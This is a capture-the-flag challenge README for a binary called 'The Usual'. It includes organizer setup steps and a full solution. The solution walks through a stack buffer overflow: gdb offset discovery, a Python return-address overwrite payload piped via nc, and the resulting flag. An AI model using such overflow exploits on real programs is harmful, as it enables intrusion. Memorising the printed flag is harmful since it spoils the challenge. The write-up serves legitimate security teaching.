# The Usual

**Author: [`Kyle Stang`](https://github.com/kylestang)**

**Category: `Misc Medium`**

## Description

In the heart of a bustling medieval market, a burly Viking with a formidable beard and weathered armor stumbles upon a peculiar sight\u2014a vibrant flag shop adorned with banners of every hue. Intrigued by the fluttering colors, he enters the shop, his towering frame contrasting with the delicate textiles. With a mix of curiosity and confusion, he marvels at the array of flags, pondering which one might best represent his warrior clan amidst the sea of symbols and sigils.

## Organizers

Run `make` in the `src` directory to compile the executable.
Players should be given `the-usual` executable in `/out`.
**Do not give them flag.txt**

On the server, run `docker-compose up -d` to start the docker container,
which will accept connections on port 3333.

Players should be given the address of the server binary.

## Solution

Decompiling the binary, two things stand out:
1. The `strtoul` function used to get the count returns 0 when no numbers are entered.
2. The buffer in print_stand is smaller than the input

Entering text, for example `a`, in the count allows the user to get to the
flag stand function. Using gdb, we can get the address of `print_flag`:
```
gef➤  info functions flag
All functions matching regular expression "flag":

Non-debugging symbols:
0x0000000000401557  print_flag
```

Creating a pattern and using it to overflow the buffer, we find from
`$rsp` that `$rip` has an offset of 40.

```
gef➤  pattern create 80
[+] Generating a pattern of 80 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa

...
gef➤ r
Welcome to the flag shop!

Please make a selection:
1: A life-altering flag-themed quote, $10
2: A hand-typed, bespoke, artist's rendition of the flag, $45
3: An organic, custom-engraved flag stand, $130
4: The flag, $20,000
5: Exit

Your balance is $100
What would you like to buy? (1-5) 3
How many would you like? a
What would you like your flag stand to say? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
Great! Your organic, custom-engraved flag stand will be delivered within three to six business weeks

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401556 in print_stand ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x65
$rbx   : 0x00007fffffffdf48  →  0x00007fffffffe38e  →  ""
$rcx   : 0x00007ffff7eb0184  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffddf8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa\n"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7f8d643  →  0xf8e710000000000a ("\n"?)
$rdi   : 0x00007ffff7f8e710  →  0x0000000000000000
$rip   : 0x0000000000401556  →  <print_stand+69> ret

...

gef➤  pattern search $rsp
[+] Searching for '6661616161616161'/'6161616161616166' with period=8
[+] Found at offset 40 (little-endian search) likely
```

So, we need to overwite the return address to go to 0x401557 with an offset of 40.
Using this python file to create the payload:
```python
print("3\na\n" + "A" * 40 + "\x57\x15\x40" + "\x00" * 5)
```

We can run it against the remote server:
```
❯ nc localhost 3333 < ../solution/payload
Welcome to the flag shop!

Please make a selection:
1: A life-altering flag-themed quote, $10
2: A hand-typed, bespoke, artist's rendition of the flag, $45
3: An organic, custom-engraved flag stand, $130
4: The flag, $20,000
5: Exit

Your balance is $100
What would you like to buy? (1-5) How many would you like? What would you like your flag stand to say? Great! Your organic, custom-engraved flag stand will be delivered within three to six business weeks
vikeCTF{B!n@ry_Xp10!7@7!0N_X64}
```

## Flag

```
vikeCTF{B!n@ry_Xp10!7@7!0N_X64}
```
